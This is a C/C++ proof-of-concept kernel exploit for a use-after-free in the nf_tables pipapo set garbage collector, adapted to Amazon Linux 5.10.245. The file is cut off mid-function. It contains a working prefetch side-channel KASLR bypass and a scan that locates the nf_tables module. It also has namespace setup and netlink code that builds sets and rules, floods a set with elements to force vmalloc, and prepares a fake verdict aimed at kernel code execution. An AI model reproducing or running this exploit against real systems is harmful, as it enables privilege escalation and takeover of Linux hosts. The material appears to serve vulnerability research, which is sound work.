/*
 * pipapo GC UAF PoC — Amazon Linux 5.10.245 adaptation
 *
 * On Amazon Linux 5.10.245: MAX_ORDER=11 → KMALLOC_MAX_SIZE=4MB.
 * With two 16-byte fields (IPv6 src+dst) and 66K elements:
 *   - bb switches from 8→4 at ~4K rules
 *   - At bb=4: groups=32, lt_size = 4096 * ceil(N/64) per field
 *   - For N=66000: lt_size ≈ 4.03MB > 4MB = KMALLOC_MAX_SIZE
 *   - kvzalloc in pipapo_clone → kmalloc FAILS → vmalloc
 *   - vmalloc has cond_resched → RCU quiescent state reported
 *   - RCU grace period completes → call_rcu callbacks fire → elements kfree'd
 *   - But rcu_assign_pointer (match swap) hasn't happened yet
 *   - Packet lookups still use OLD live match → access freed element memory → UAF
 *
 * No memory fragmentation needed — this is deterministic.
 *
 * Target element layout (kmalloc-512, 305 bytes with USERDATA):
 *   [0-15]   nft_set_ext header (genmask + offset[9] + padding)
 *   [16-47]  KEY (32B: src_ipv6 ++ dst_ipv6)
 *   [48-79]  KEY_END (32B)
 *   [80-87]  EXPIRATION (8B)
 *   [88-95]  TIMEOUT (8B)
 *   [96-103] DATA (8B)
 *   [104-304] USERDATA (1B len + 200B data) → pushes to kmalloc-512
 *
 * Filler element layout (kmalloc-128, 104 bytes):
 *   Same as above minus USERDATA
 *
 * The target allocation uses GFP_KERNEL.  The main path therefore uses
 * normal-cache nft_rule and nft_set-element reclaim objects; msg_msg and
 * AF_UNIX skb data are GFP_KERNEL_ACCOUNT and are only legacy helpers here.
 *
 * After kfree: SLUB freelist pointer at s->offset corrupts some field.
 * If s->offset=0: ext header corrupted → offset table wrong →
 *   nft_set_elem_expired reads from wrong location → returns false →
 *   lookup proceeds → data read from wrong offset → changed value = UAF.
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <stdint.h>
#include <endian.h>
#include <byteswap.h>
#include <time.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <linux/membarrier.h>
#include <sys/resource.h>
#include <sys/wait.h>

#include <sys/sysmacros.h>
#include <vector>
#include <algorithm>
/* ====== KASLR bypass via prefetch side-channel (Intel) ======
 * Based on "Prefetch Side-Channel Attacks" by Daniel Gruss et al.
 * Used by ~60% of kernelCTF submissions. Works through KPTI.
 * prefetchnta on mapped kernel pages shows different timing than unmapped. */

inline __attribute__((always_inline)) uint64_t rdtsc_begin(void) {
    uint64_t a, d;
    asm volatile("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "xor %%rax, %%rax\n\t"
        "lfence\n\t"
        : "=r" (d), "=r" (a) : : "%rax", "%rbx", "%rcx", "%rdx");
    return (d << 32) | a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end(void) {
    uint64_t a, d;
    asm volatile("xor %%rax, %%rax\n\t"
        "lfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
        : "=r" (d), "=r" (a) : : "%rax", "%rbx", "%rcx", "%rdx");
    return (d << 32) | a;
}

static size_t flushandreload(void *addr) {
    size_t time = rdtsc_begin();
    asm volatile("prefetchnta (%0)\nprefetcht2 (%0)\n" : : "r" (addr));
    return rdtsc_end() - time;
}

/* Prefetch side-channel KASLR bypass.
 * Kernel text pages show distinctly LOWER prefetch latency (~131-134 cycles)
 * vs unmapped pages (~201-209 cycles) in this KVM environment.
 * Algorithm: measure all 2MB-aligned addresses, find the first address with
 * timing significantly below the unmapped baseline → that's _stext. */
#define KASLR_START  0xffffffff81000000ULL
#define KASLR_END    0xffffffffc0000000ULL
#define KASLR_STEP   0x0000000000200000ULL  /* 2MB */
#define KASLR_NADDR  ((KASLR_END - KASLR_START) / KASLR_STEP)
#define KASLR_ROUNDS 64
#define KASLR_TRIALS 7

static uint64_t bypass_kaslr(void) {
    uint64_t results[KASLR_TRIALS];

    for (int trial = 0; trial < KASLR_TRIALS; trial++) {
        size_t times[KASLR_NADDR];
        for (int i = 0; i < (int)KASLR_NADDR; i++)
            times[i] = ~(size_t)0;

        /* Warmup pass */
        for (int i = 0; i < (int)KASLR_NADDR; i++)
            flushandreload((void *)(KASLR_START + KASLR_STEP * (uint64_t)i));

        /* Measure: take minimum across rounds (filters noise) */
        for (int round = 0; round < KASLR_ROUNDS; round++) {
            for (int i = 0; i < (int)KASLR_NADDR; i++) {
                size_t t = flushandreload((void *)(KASLR_START + KASLR_STEP * (uint64_t)i));
                if (t < times[i]) times[i] = t;
            }
        }

        /* Find global minimum (= kernel .text timing) */
        size_t min_val = ~(size_t)0;
        for (int i = 0; i < (int)KASLR_NADDR; i++)
            if (times[i] < min_val) min_val = times[i];

        /* Threshold: min + 20 cycles. Kernel .text is ~131-138, unmapped is ~201+.
         * This captures the .text band with huge margin from unmapped. */
        size_t threshold = min_val + 20;

        /* Find first pair of consecutive addresses below threshold → _stext */
        results[trial] = 0;
        for (int i = 0; i < (int)KASLR_NADDR - 1; i++) {
            if (times[i] <= threshold && times[i + 1] <= threshold) {
                results[trial] = KASLR_START + KASLR_STEP * (uint64_t)i;
                break;
            }
        }
        printf("[*] KASLR trial %d: min=%zu thr=%zu → 0x%lx\n",
               trial, min_val, threshold, (unsigned long)results[trial]);
    }

    /* Boyer-Moore majority vote */
    uint64_t candidate = 0;
    int count = 0;
    for (int i = 0; i < KASLR_TRIALS; i++) {
        if (count == 0) { candidate = results[i]; count = 1; }
        else if (candidate == results[i]) count++;
        else count--;
    }
    count = 0;
    for (int i = 0; i < KASLR_TRIALS; i++)
        if (results[i] == candidate) count++;

    if (count > KASLR_TRIALS / 2 && candidate != 0) {
        printf("[+] KASLR bypass: _stext = 0x%lx (%d/%d votes)\n",
               (unsigned long)candidate, count, KASLR_TRIALS);
        return candidate;
    }

    printf("[-] KASLR majority vote failed (%d/%d for 0x%lx)\n",
           count, KASLR_TRIALS, (unsigned long)candidate);
    return 0;
}


/*
 * Amazon Linux 5.10.245 builds nf_tables as a module.  Module addresses are
 * independent of _stext and are hidden by kptr_restrict=1.  Locate the unique
 * 0x45000-byte nf_tables core allocation in the x86-64 module window using the
 * same prefetch timing primitive as EntryBleed.  vmalloc places a guard page
 * between allocations, so core allocations appear as separate mapped runs.
 */
static uint64_t detect_nf_tables_text(void) {
    constexpr uint64_t mod_start = 0xffffffffc0000000ULL;
    constexpr uint64_t mod_end   = 0xffffffffff000000ULL;
    constexpr uint64_t step      = 0x1000ULL;
    constexpr size_t rounds      = 16;
    const size_t n = (mod_end - mod_start) / step;
    std::vector<size_t> t(n, ~(size_t)0);

    for (size_t r = 0; r < rounds; r++) {
        for (size_t i = 0; i < n; i++) {
            size_t v = flushandreload((void *)(mod_start + i * step));
            if (v < t[i]) t[i] = v;
        }
    }

    size_t minv = *std::min_element(t.begin(), t.end());
    size_t threshold = minv + 40;
    size_t best_start = 0, best_len = 0;
    size_t i = 0;
    while (i < n) {
        while (i < n && t[i] > threshold) i++;
        size_t start = i;
        while (i < n && t[i] <= threshold) i++;
        size_t len = i - start;
        if (len >= 0x45000ULL / step) {
            if (!best_len || std::abs((long)len - (long)(0x45000ULL / step)) <
                             std::abs((long)best_len - (long)(0x45000ULL / step))) {
                best_start = start;
                best_len = len;
            }
        }
    }

    if (!best_len) {
        printf("[-] nf_tables module text not found (min=%zu thr=%zu)\n", minv, threshold);
        return 0;
    }
    uint64_t text = mod_start + best_start * step;
    printf("[+] nf_tables .text candidate: 0x%016lx (run=%zu pages)\n",
           (unsigned long)text, best_len);
    return text;
}

#if __BYTE_ORDER == __BIG_ENDIAN
#define H32(x) (x)
#else
#define H32(x) __bswap_32(x)
#endif

#ifndef NLA_F_NESTED
#define NLA_F_NESTED (1 << 15)
#endif
#ifndef SOL_NETLINK
#define SOL_NETLINK 270
#endif
#ifndef NFNL_MSG_BATCH_BEGIN
#define NFNL_MSG_BATCH_BEGIN 0x10
#endif
#ifndef NFNL_MSG_BATCH_END
#define NFNL_MSG_BATCH_END 0x11
#endif
#ifndef NFT_SET_INTERVAL
#define NFT_SET_INTERVAL  0x04
#endif
#ifndef NFT_SET_MAP
#define NFT_SET_MAP       0x08
#endif
#ifndef NFT_SET_TIMEOUT
#define NFT_SET_TIMEOUT   0x10
#endif
#ifndef NFT_SET_CONCAT
#define NFT_SET_CONCAT    0x80
#endif
#ifndef NFTA_PAYLOAD_DREG
#define NFTA_PAYLOAD_DREG   1
#define NFTA_PAYLOAD_BASE   2
#define NFTA_PAYLOAD_OFFSET 3
#define NFTA_PAYLOAD_LEN    4
#endif
#ifndef NFT_PAYLOAD_NETWORK_HEADER
#define NFT_PAYLOAD_NETWORK_HEADER 1
#endif
#ifndef NFT_PAYLOAD_TRANSPORT_HEADER
#define NFT_PAYLOAD_TRANSPORT_HEADER 2
#endif
#ifndef NFT_REG_1
#define NFT_REG_1     1
#endif
#ifndef NFT_REG_2
#define NFT_REG_2     2
#endif
#ifndef NFT_REG_3
#define NFT_REG_3     3
#endif
#ifndef NFT_REG32_00
#define NFT_REG32_00  8
#define NFT_REG32_01  9
#endif
#ifndef NFTA_LOOKUP_DREG
#define NFTA_LOOKUP_DREG 3
#endif
#ifndef NFTA_PAYLOAD_SREG
#define NFTA_PAYLOAD_SREG 5
#endif
#ifndef NFTA_SET_ELEM_USERDATA
#define NFTA_SET_ELEM_USERDATA 6  /* enum nft_set_elem_attributes: UNSPEC=0,KEY=1,DATA=2,FLAGS=3,TIMEOUT=4,EXPIRATION=5,USERDATA=6 */
#endif

#define BUF_SIZE      (8 * 1024 * 1024)
/* 66K fillers → lt_size > 4MB → vmalloc (KMALLOC_MAX_SIZE=4MB on amzn2)
 * Count must be ≡ 31 (mod 32) so the target fills the last slab page slot.
 * This ensures ALL adjacent objects are fillers (genmask=0), preventing:
 *  - EXPRESSIONS crash (next object byte 0 = 0 → elem_expr->size = 0)
 *  - Expiration false-skip (third object has small offsets → "not expired")
 */
/* Target slot = NUM_FILLERS mod 32. After msg_msg reclaim,
 * offset[EXPIRATION] = 0xFF (byte 6 of kernel ptr) → reads ext+1020.
 * For target at slot N: ext+1020 = N*128+1020. Must be < 4096 (page size)
 * → N ≤ 24. So NUM_FILLERS mod 32 must be ≤ 24.
 * 130000 mod 32 = 16 → target at slot 16 → ext+1020 = 3068 ✓ (in-page)
 * Still > 4MB lt_size → vmalloc forced. */
#define NUM_FILLERS   66000   /* Just over 64K → lt_size ~4.03MB > 4MB → vmalloc forced */
#define NUM_TARGETS   1
#define NUM_PADDING   0       /* Disabled for fast setup; 66K fillers sufficient for vmalloc */
#define BATCH_CHUNK   2500

/* Target element has USERDATA extension → 305 bytes → kmalloc-cg-512.
 * 512-byte aligned objects guarantee:
 *   byte 0 (genmask) = 0x00 → always active  ✓
 *   byte 8 (offset[EXPRESSIONS]) = 0x00 → no expr eval → no crash  ✓
 * AND: offset[EXPIRATION] = 0xFF (byte 6) → reads ext+255 which is
 * WITHIN the same 512-byte object → reads mtext data → positive jiffies
 * → NOT expired  ✓  (This was broken in kmalloc-cg-256 where ext+255
 * crossed into the next object's m_list.next kernel pointer → negative
 * signed jiffies → always "expired" → lookup skipped the element.) */
#define TARGET_UDATA_LEN  200  /* 104 + 1 + 200 = 305 → kmalloc-cg-512 */

/* Spray: msg_msg header=48 + data=464 = 512 → kmalloc-cg-512 (same as target) */
#define NUM_SPRAY_QUEUES  512
#define NUM_RECLAIM_QUEUES 256
#define SPRAY_MSG_DSIZE   464
#define MAX_SPRAY_MSGS    65536
#define MAX_CYCLES        10

/* No pre-spray needed: 130K fillers now in kmalloc-cg-128 (same cache as target)
 * due to TIMEOUT extension from non-default timeout (3599999ms ≠ 3600000ms). */

#define die(fmt, ...) do { fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__); exit(1); } while(0)

/* ====== NLA helpers ====== */
static void nla_put(char *buf, int *off, uint16_t type, const void *data, int len) {
    struct { uint16_t nla_len; uint16_t nla_type; } *a = (decltype(a))(buf + *off);
    a->nla_len = 4 + len; a->nla_type = type;
    if (data && len > 0) memcpy(buf + *off + 4, data, len);
    *off += (4 + len + 3) & ~3;
}
static void nla_put_str(char *buf, int *off, uint16_t type, const char *s) {
    nla_put(buf, off, type, s, strlen(s) + 1);
}
static void nla_put_u32(char *buf, int *off, uint16_t type, uint32_t v) {
    v = H32(v); nla_put(buf, off, type, &v, 4);
}
static void nla_put_u64(char *buf, int *off, uint16_t type, uint64_t v) {
    v = htobe64(v); nla_put(buf, off, type, &v, 8);
}
static int nest_start(char *buf, int *off, uint16_t type) {
    int s = *off;
    struct { uint16_t nla_len; uint16_t nla_type; } *a = (decltype(a))(buf + *off);
    a->nla_len = 0; a->nla_type = type | NLA_F_NESTED;
    *off += 4; return s;
}
static void nest_end(char *buf, int *off, int s) {
    ((uint16_t *)(buf + s))[0] = *off - s;
}

/* ====== Netlink ====== */
static void msg_hdr(char *buf, int *off, uint16_t type, uint16_t flags, uint8_t fam) {
    struct nlmsghdr *n = (struct nlmsghdr *)(buf + *off);
    n->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | type;
    n->nlmsg_flags = NLM_F_REQUEST | flags;
    n->nlmsg_seq = n->nlmsg_pid = 0;
    *off += sizeof(*n);
    struct nfgenmsg *g = (struct nfgenmsg *)(buf + *off);
    g->nfgen_family = fam; g->version = NFNETLINK_V0; g->res_id = 0;
    *off += sizeof(*g);
}
static void msg_end(char *buf, int hdr, int *off) {
    ((struct nlmsghdr *)(buf + hdr))->nlmsg_len = *off - hdr;
}
static void batch_begin(char *buf, int *off) {
    struct nlmsghdr *n = (struct nlmsghdr *)(buf + *off);
    n->nlmsg_type = NFNL_MSG_BATCH_BEGIN; n->nlmsg_flags = NLM_F_REQUEST;
    n->nlmsg_seq = n->nlmsg_pid = 0;
    n->nlmsg_len = sizeof(*n) + sizeof(struct nfgenmsg);
    *off += sizeof(*n);
    struct nfgenmsg *g = (struct nfgenmsg *)(buf + *off);
    g->nfgen_family = AF_UNSPEC; g->version = NFNETLINK_V0;
    g->res_id = H32(NFNL_SUBSYS_NFTABLES) >> 16;
    *off += sizeof(*g);
}
static void batch_end(char *buf, int *off) {
    struct nlmsghdr *n = (struct nlmsghdr *)(buf + *off);
    n->nlmsg_type = NFNL_MSG_BATCH_END; n->nlmsg_flags = NLM_F_REQUEST;
    n->nlmsg_seq = n->nlmsg_pid = 0;
    n->nlmsg_len = sizeof(*n) + sizeof(struct nfgenmsg);
    *off += sizeof(*n);
    struct nfgenmsg *g = (struct nfgenmsg *)(buf + *off);
    g->nfgen_family = AF_UNSPEC; g->version = NFNETLINK_V0;
    g->res_id = H32(NFNL_SUBSYS_NFTABLES) >> 16;
    *off += sizeof(*g);
}

static void write_file(const char *p, const char *d) {
    int fd = open(p, O_WRONLY); if (fd < 0) return;
    ssize_t n = write(fd, d, strlen(d)); (void)n; close(fd);
}

static void setup_ns(void) {
    uid_t uid = getuid(); gid_t gid = getgid();
    char m[64];
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWIPC) < 0) {
        /* Fall back without IPC namespace */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
            die("unshare: %s", strerror(errno));
        printf("[*] IPC namespace: shared (host)\n");
    } else {
        printf("[*] IPC namespace: private\n");
    }
    write_file("/proc/self/setgroups", "deny");
    snprintf(m, sizeof(m), "0 %d 1\n", uid); write_file("/proc/self/uid_map", m);
    snprintf(m, sizeof(m), "0 %d 1\n", gid); write_file("/proc/self/gid_map", m);
}

static void setup_lo(void) {
    /* Bring up loopback for both IPv4 and IPv6 */
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {}; strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    ioctl(fd, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP;
    ioctl(fd, SIOCSIFFLAGS, &ifr);
    close(fd);
    /* IPv6 ::1 is auto-assigned when lo comes up in a new netns */
    usleep(100000); /* 100ms for IPv6 DAD */
}

static int nl_open(void) {
    int fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER);
    if (fd < 0) die("nl socket: %s", strerror(errno));
    struct sockaddr_nl a = { .nl_family = AF_NETLINK };
    if (bind(fd, (struct sockaddr *)&a, sizeof(a)) < 0) die("nl bind");
    int bs = 16<<20;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bs, sizeof(bs));
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &bs, sizeof(bs));
    return fd;
}

static int nl_send(int fd, char *buf, int len) {
    struct sockaddr_nl a = { .nl_family = AF_NETLINK };
    struct iovec v = {}; v.iov_base = buf; v.iov_len = len;
    struct msghdr m = {}; m.msg_name = &a; m.msg_namelen = sizeof(a); m.msg_iov = &v; m.msg_iovlen = 1;
    return sendmsg(fd, &m, 0) < 0 ? -errno : 0;
}

static int nl_recv_ack(int fd) {
    char r[16384];
    struct timeval tv = { 120, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    int n = recv(fd, r, sizeof(r), 0);
    if (n < 0) return -errno;
    for (struct nlmsghdr *h = (struct nlmsghdr *)r; NLMSG_OK(h, (unsigned int)n); h = NLMSG_NEXT(h, n)) {
        if (h->nlmsg_type == NLMSG_ERROR) {
            int e = ((struct nlmsgerr *)NLMSG_DATA(h))->error;
            if (e) return e;
        }
    }
    return 0;
}

static int nl_do(int fd, char *buf, int len) {
    int r = nl_send(fd, buf, len);
    if (r) return r;
    return nl_recv_ack(fd);
}

/* ====== NFT operations ====== */
static int nft_table(int fd, char *buf) {
    int off = 0; batch_begin(buf, &off);
    int h = off; msg_hdr(buf, &off, NFT_MSG_NEWTABLE, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_TABLE_NAME, "t");
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

static int nft_chain(int fd, char *buf) {
    int off = 0; batch_begin(buf, &off);
    int h = off; msg_hdr(buf, &off, NFT_MSG_NEWCHAIN, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_CHAIN_TABLE, "t");
    nla_put_str(buf, &off, NFTA_CHAIN_NAME, "c");
    uint32_t pol = H32(NF_ACCEPT);
    nla_put(buf, &off, NFTA_CHAIN_POLICY, &pol, 4);
    int hk = nest_start(buf, &off, NFTA_CHAIN_HOOK);
    nla_put_u32(buf, &off, NFTA_HOOK_HOOKNUM, NF_INET_LOCAL_OUT);
    nla_put_u32(buf, &off, NFTA_HOOK_PRIORITY, 0);
    nest_end(buf, &off, hk);
    nla_put_str(buf, &off, NFTA_CHAIN_TYPE, "filter");
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

static int nft_set_common(int fd, char *buf, const char *name, int id,
                          uint32_t data_type, uint32_t data_len) {
    int off = 0; batch_begin(buf, &off);
    int h = off; msg_hdr(buf, &off, NFT_MSG_NEWSET, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_SET_TABLE, "t");
    nla_put_str(buf, &off, NFTA_SET_NAME, name);
    nla_put_u32(buf, &off, NFTA_SET_ID, id);
    nla_put_u32(buf, &off, NFTA_SET_FLAGS,
                NFT_SET_INTERVAL | NFT_SET_TIMEOUT | NFT_SET_CONCAT | NFT_SET_MAP);
    nla_put_u32(buf, &off, NFTA_SET_KEY_LEN, 32);  /* Two 16-byte fields */
    nla_put_u32(buf, &off, NFTA_SET_KEY_TYPE, 0);
    nla_put_u32(buf, &off, NFTA_SET_DATA_TYPE, data_type);
    nla_put_u32(buf, &off, NFTA_SET_DATA_LEN, data_len);
    nla_put_u64(buf, &off, NFTA_SET_TIMEOUT, 3600000ULL); /* 1hr default */
    nla_put_u32(buf, &off, NFTA_SET_GC_INTERVAL, 1000);   /* 1s GC */
    /* Concat desc: 2 fields of 16 bytes each */
    int d = nest_start(buf, &off, NFTA_SET_DESC);
    int cc = nest_start(buf, &off, NFTA_SET_DESC_CONCAT);
    int f1 = nest_start(buf, &off, 1);
    nla_put_u32(buf, &off, NFTA_SET_FIELD_LEN, 16);
    nest_end(buf, &off, f1);
    int f2 = nest_start(buf, &off, 1);
    nla_put_u32(buf, &off, NFTA_SET_FIELD_LEN, 16);
    nest_end(buf, &off, f2);
    nest_end(buf, &off, cc);
    nest_end(buf, &off, d);
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

/* Data map set "s" — for Phase 1 heap leak observation */
static int nft_set(int fd, char *buf) {
    return nft_set_common(fd, buf, "s", 1, 1 /* NFT_DATA_VALUE */, 8);
}

/* Verdict map set "v" — for Phase 3 code execution.
 * NFT_DATA_VERDICT = 0xffffff00. Data len = 16 (sizeof nft_data verdict). */
#define NFT_DATA_VERDICT 0xffffff00U
static int nft_set_v(int fd, char *buf) {
    return nft_set_common(fd, buf, "v", 2, NFT_DATA_VERDICT, 16);
}

static void add_payload_expr(char *buf, int *off, uint32_t dreg, uint32_t base,
                             uint32_t offset, uint32_t len) {
    int e = nest_start(buf, off, 1);
    nla_put_str(buf, off, NFTA_EXPR_NAME, "payload");
    int d = nest_start(buf, off, NFTA_EXPR_DATA);
    nla_put_u32(buf, off, NFTA_PAYLOAD_DREG, dreg);
    nla_put_u32(buf, off, NFTA_PAYLOAD_BASE, base);
    nla_put_u32(buf, off, NFTA_PAYLOAD_OFFSET, offset);
    nla_put_u32(buf, off, NFTA_PAYLOAD_LEN, len);
    nest_end(buf, off, d);
    nest_end(buf, off, e);
}

static int nft_rule(int fd, char *buf) {
    int off = 0; batch_begin(buf, &off);
    int h = off; msg_hdr(buf, &off, NFT_MSG_NEWRULE,
                         NLM_F_CREATE|NLM_F_APPEND|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_RULE_TABLE, "t");
    nla_put_str(buf, &off, NFTA_RULE_CHAIN, "c");
    int exprs = nest_start(buf, &off, NFTA_RULE_EXPRESSIONS);

    /* Extract src IPv6 (16 bytes at offset 8 from network header) → REG_1 */
    add_payload_expr(buf, &off, NFT_REG_1, NFT_PAYLOAD_NETWORK_HEADER, 8, 16);
    /* Extract dst IPv6 (16 bytes at offset 24 from network header) → REG_2 */
    add_payload_expr(buf, &off, NFT_REG_2, NFT_PAYLOAD_NETWORK_HEADER, 24, 16);

    /* Lookup in set "s", sreg=REG_1 (reads 32 bytes: REG_1+REG_2), dreg=REG_3 */
    int le = nest_start(buf, &off, 1);
    nla_put_str(buf, &off, NFTA_EXPR_NAME, "lookup");
    int ld = nest_start(buf, &off, NFTA_EXPR_DATA);
    nla_put_str(buf, &off, NFTA_LOOKUP_SET, "s");
    nla_put_u32(buf, &off, NFTA_LOOKUP_SREG, NFT_REG_1);
    nla_put_u32(buf, &off, NFTA_LOOKUP_DREG, NFT_REG_3);
    nest_end(buf, &off, ld);
    nest_end(buf, &off, le);

    /* Write REG_3 data to transport header + 8 (UDP payload first 8 bytes) */
    int pe = nest_start(buf, &off, 1);
    nla_put_str(buf, &off, NFTA_EXPR_NAME, "payload");
    int pd = nest_start(buf, &off, NFTA_EXPR_DATA);
    nla_put_u32(buf, &off, NFTA_PAYLOAD_SREG, NFT_REG_3);
    nla_put_u32(buf, &off, NFTA_PAYLOAD_BASE, NFT_PAYLOAD_TRANSPORT_HEADER);
    nla_put_u32(buf, &off, NFTA_PAYLOAD_OFFSET, 8);
    nla_put_u32(buf, &off, NFTA_PAYLOAD_LEN, 8);
    nest_end(buf, &off, pd);
    nest_end(buf, &off, pe);

    nest_end(buf, &off, exprs);
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

/* Forward declarations for key builders (defined later) */
static void build_filler_key(uint8_t *key, int idx);
static void build_filler_key_end(uint8_t *key, int idx);
static void build_target_key(uint8_t *key);

/* Verdict map lookup rule: payload → lookup(v, dreg=VERDICT).
 * When lookup succeeds, verdict is set from ext DATA (our controlled fake verdict). */
static int nft_rule_v(int fd, char *buf) {
    int off = 0; batch_begin(buf, &off);
    int h = off; msg_hdr(buf, &off, NFT_MSG_NEWRULE,
                         NLM_F_CREATE|NLM_F_APPEND|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_RULE_TABLE, "t");
    nla_put_str(buf, &off, NFTA_RULE_CHAIN, "c");
    int exprs = nest_start(buf, &off, NFTA_RULE_EXPRESSIONS);

    /* Extract src IPv6 → REG_1 */
    add_payload_expr(buf, &off, NFT_REG_1, NFT_PAYLOAD_NETWORK_HEADER, 8, 16);
    /* Extract dst IPv6 → REG_2 */
    add_payload_expr(buf, &off, NFT_REG_2, NFT_PAYLOAD_NETWORK_HEADER, 24, 16);

    /* Lookup in verdict map "v", sreg=REG_1, dreg=NFT_REG_VERDICT (=0) */
    int le = nest_start(buf, &off, 1);
    nla_put_str(buf, &off, NFTA_EXPR_NAME, "lookup");
    int ld = nest_start(buf, &off, NFTA_EXPR_DATA);
    nla_put_str(buf, &off, NFTA_LOOKUP_SET, "v");
    nla_put_u32(buf, &off, NFTA_LOOKUP_SREG, NFT_REG_1);
    nla_put_u32(buf, &off, NFTA_LOOKUP_DREG, 0);  /* NFT_REG_VERDICT = 0 */
    nest_end(buf, &off, ld);
    nest_end(buf, &off, le);

    nest_end(buf, &off, exprs);
    msg_end(buf, h, &off); batch_end(buf, &off);
    return nl_do(fd, buf, off);
}

/* Add fillers to a named set. Same logic as add_fillers but takes set name. */
static int add_fillers_to(int fd, char *buf, int count, const char *setname) {
    int sent = 0;
    uint8_t key[32], key_end[32];

    while (sent < count) {
        int off = 0;
        batch_begin(buf, &off);
        int chunk = 0;
        for (; chunk < BATCH_CHUNK && sent + chunk < count; chunk++) {
            int idx = sent + chunk;
            int h = off;
            msg_hdr(buf, &off, NFT_MSG_NEWSETELEM,
                    NLM_F_CREATE | (chunk == BATCH_CHUNK-1 || sent+chunk == count-1 ? NLM_F_ACK : 0),
                    NFPROTO_INET);
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
            nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, setname);
            int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
            int el = nest_start(buf, &off, 1);
            int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
            build_filler_key(key, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
            nest_end(buf, &off, k);
            int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
            build_filler_key_end(key_end, idx);
            nla_put(buf, &off, NFTA_DATA_VALUE, key_end, 32);
            nest_end(buf, &off, ke);
            /* Data: verdict map uses NFTA_DATA_VERDICT nested attr */
            { int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
              int vd = nest_start(buf, &off, 2 /* NFTA_DATA_VERDICT */);
              nla_put_u32(buf, &off, 1 /* NFTA_VERDICT_CODE */, 0xFFFFFFFF /* NFT_CONTINUE */);
              nest_end(buf, &off, vd);
              nest_end(buf, &off, dt); }
            nla_put_u64(buf, &off, NFTA_SET_ELEM_TIMEOUT, 3599999ULL);
            nest_end(buf, &off, el);
            nest_end(buf, &off, els);
            msg_end(buf, h, &off);
            if (off > BUF_SIZE - 4096) break;
        }
        batch_end(buf, &off);
        int r = nl_do(fd, buf, off);
        if (r) { printf("[!] Filler batch at %d for %s failed: %d\n", sent, setname, r); return r; }
        sent += chunk;
        if (sent % 5000 == 0 || sent >= count)
            printf("[+] Fillers(%s): %d/%d\n", setname, sent, count);
    }
    return 0;
}

/* Add target element to verdict map "v" with USERDATA (→ kmalloc-cg-512) */
static int add_target_v(int fd, char *buf) {
    uint8_t key[32];
    int off = 0; batch_begin(buf, &off);
    int h = off;
    msg_hdr(buf, &off, NFT_MSG_NEWSETELEM, NLM_F_CREATE|NLM_F_ACK, NFPROTO_INET);
    nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_TABLE, "t");
    nla_put_str(buf, &off, NFTA_SET_ELEM_LIST_SET, "v");
    int els = nest_start(buf, &off, NFTA_SET_ELEM_LIST_ELEMENTS);
    int el = nest_start(buf, &off, 1);
    int k = nest_start(buf, &off, NFTA_SET_ELEM_KEY);
    build_target_key(key);
    nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(buf, &off, k);
    int ke = nest_start(buf, &off, NFTA_SET_ELEM_KEY_END);
    nla_put(buf, &off, NFTA_DATA_VALUE, key, 32);
    nest_end(buf, &off, ke);
    /* Data: NFT_CONTINUE verdict (will be overwritten by our UAF spray) */
    { int dt = nest_start(buf, &off, NFTA_SET_ELEM_DATA);
      int vd = nest_start(buf, &off, 2 /* NFTA_DATA_VERDICT */);
      nla_put_u32(buf, &off, 1 /* NFTA_VERDICT_CODE */, 0xFFFFFFFF /* NFT_CONTINUE */);
      nest_end(buf, &off, vd);
      nest_end(buf, &off, dt); }
    nla_put_u64(buf, &off, NFTA_SET_ELEM_TIMEOUT, 2000ULL);  /* 2s timeout */
    { uint8_t udata[TARGET_UDATA_LEN];
      memset(udata, 0xCC, TARGET_UDATA_LEN);
      nla_put(buf, &off, NFTA_SET_ELEM_USERDATA, udata, TARGET_UDATA_LEN);
    }
